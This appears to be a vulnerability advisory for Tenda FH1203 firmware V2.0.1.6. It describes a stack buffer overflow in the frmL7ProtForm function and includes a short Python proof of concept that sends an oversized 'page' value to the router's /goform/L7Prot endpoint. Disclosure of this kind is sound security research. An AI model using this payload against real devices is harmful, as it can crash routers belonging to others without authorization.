# frmL7ProtForm

## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details

There is a stack buffer overflow vulnerability in  FH1203 V2.0.1.6, located in the **frmL7ProtForm** function. The function receives the `page` parameter from a POST request. `   sprintf(v15, "firewall_proto_list.asp?page=%s", v10);` The statement will cause a buffer overflow. The `page` value provided by the user may exceed the capacity of the `v15` array, thereby triggering this security vulnerability.


![image](https://github.com/user-attachments/assets/5544755d-084f-451d-a7fe-33cc028751fe)


## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/L7Prot"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image](https://github.com/user-attachments/assets/766905c2-ed63-4bff-83c1-b9164697775b)
